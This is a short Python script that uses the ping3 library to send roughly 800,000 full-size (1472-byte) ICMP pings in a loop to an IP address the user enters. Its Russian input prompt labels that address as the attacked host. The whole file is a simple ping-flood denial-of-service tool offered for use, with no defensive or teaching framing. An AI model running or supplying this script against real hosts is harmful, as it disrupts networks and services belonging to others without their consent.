from ping3 import ping

def send_ping(destination, size,n):
    for i in range(1,n):
        response_time = ping(destination, size=size)

destination = str(input('IP-адрес атакуемого хоста: '))
size = 1472  # MTU

send_ping(destination, size, 800000)